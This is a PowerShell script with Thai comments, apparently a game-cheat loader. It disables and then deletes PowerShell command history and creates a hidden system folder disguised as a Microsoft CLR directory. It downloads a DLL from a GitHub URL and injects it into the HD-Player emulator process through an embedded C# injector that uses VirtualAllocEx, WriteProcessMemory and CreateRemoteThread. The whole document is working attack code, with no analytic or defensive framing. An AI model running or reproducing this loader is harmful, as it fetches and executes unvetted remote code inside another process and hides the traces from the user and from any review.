# 1. จัดการเรื่องประวัติและข้อผิดพลาด
try { Set-PSReadlineOption -HistorySaveStyle SaveNothing } catch {}
$ErrorActionPreference = 'SilentlyContinue'
$ProgressPreference = 'SilentlyContinue'

# 2. ตั้งค่าที่อยู่โฟลเดอร์เป้าหมาย
$workDir = "$env:LOCALAPPDATA\Microsoft\CLR_v4.0"
if (Test-Path $workDir) { 
    Remove-Item $workDir -Recurse -Force -ErrorAction SilentlyContinue 
}
New-Item -Path $workDir -ItemType Directory -Force | Out-Null 
& attrib +h +s $workDir

# กำหนดพาธไฟล์ DLL และลิงก์ดาวน์โหลด
$dllOutput = Join-Path $workDir "BASX.dll"
$dllUrl = "https://github.com/zenxler98-ui/BASX/raw/refs/heads/main/BASX.dll"
$targetProcess = "HD-Player"

# 3. ดาวน์โหลดเฉพาะไฟล์ DLL
if (Test-Path $dllOutput) { Remove-Item $dllOutput -Force }

[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
try {
    $wc = New-Object System.Net.WebClient
    $wc.DownloadFile($dllUrl, $dllOutput)
} catch {
    Invoke-WebRequest -Uri $dllUrl -OutFile $dllOutput -UseBasicParsing
}

# 4. ฟังก์ชัน Inject DLL เข้า HD-Player ผ่าน Windows API
$InjectorSource = @"
using System;
using System.Diagnostics;
using System.Runtime.InteropServices;
using System.Text;

public class DllInjector {
    [DllImport("kernel32.dll", SetLastError = true)]
    public static extern IntPtr OpenProcess(int dwDesiredAccess, bool bInheritHandle, int dwProcessId);

    [DllImport("kernel32.dll", SetLastError = true)]
    public static extern IntPtr VirtualAllocEx(IntPtr hProcess, IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);

    [DllImport("kernel32.dll", SetLastError = true)]
    public static extern bool WriteProcessMemory(IntPtr hProcess, IntPtr lpBaseAddress, byte[] lpBuffer, uint nSize, out IntPtr lpNumberOfBytesWritten);

    [DllImport("kernel32.dll", SetLastError = true)]
    public static extern IntPtr GetProcAddress(IntPtr hModule, string lpProcName);

    [DllImport("kernel32.dll", SetLastError = true)]
    public static extern IntPtr GetModuleHandle(string lpModuleName);

    [DllImport("kernel32.dll", SetLastError = true)]
    public static extern IntPtr CreateRemoteThread(IntPtr hProcess, IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);

    [DllImport("kernel32.dll", SetLastError = true)]
    public static extern bool CloseHandle(IntPtr hObject);

    public static bool Inject(int processId, string dllPath) {
        IntPtr hProcess = OpenProcess(0x1F0FFF, false, processId);
        if (hProcess == IntPtr.Zero) return false;

        IntPtr loadLibraryAddr = GetProcAddress(GetModuleHandle("kernel32.dll"), "LoadLibraryA");
        if (loadLibraryAddr == IntPtr.Zero) return false;

        uint size = (uint)((dllPath.Length + 1) * sizeof(char));
        IntPtr allocMemAddress = VirtualAllocEx(hProcess, IntPtr.Zero, size, 0x1000 | 0x2000, 0x04);
        if (allocMemAddress == IntPtr.Zero) return false;

        byte[] bytes = Encoding.ASCII.GetBytes(dllPath);
        IntPtr bytesWritten;
        WriteProcessMemory(hProcess, allocMemAddress, bytes, (uint)bytes.Length, out bytesWritten);

        IntPtr hThread = CreateRemoteThread(hProcess, IntPtr.Zero, 0, loadLibraryAddr, allocMemAddress, 0, IntPtr.Zero);
        if (hThread == IntPtr.Zero) return false;

        CloseHandle(hProcess);
        return true;
    }
}
"@

# เพิ่ม Type C# เข้าไปใน PowerShell Session
if (-not ([System.Management.Automation.PSTypeName]'DllInjector').Type) {
    Add-Type -TypeDefinition $InjectorSource -Language CSharp
}

# 5. ค้นหา Process HD-Player และทำการ Inject
if (Test-Path $dllOutput) {
    $proc = Get-Process -Name $targetProcess -ErrorAction SilentlyContinue | Select-Object -First 1
    if ($proc) {
        [DllInjector]::Inject($proc.Id, $dllOutput)
    }
}

# 6. ลบประวัติการใช้งาน PowerShell ทันที
try {
    Set-PSReadlineOption -HistorySaveStyle SaveIncrementally
    Remove-Item (Get-PSReadlineOption).HistorySavePath -Force -ErrorAction SilentlyContinue
} catch {}

exit
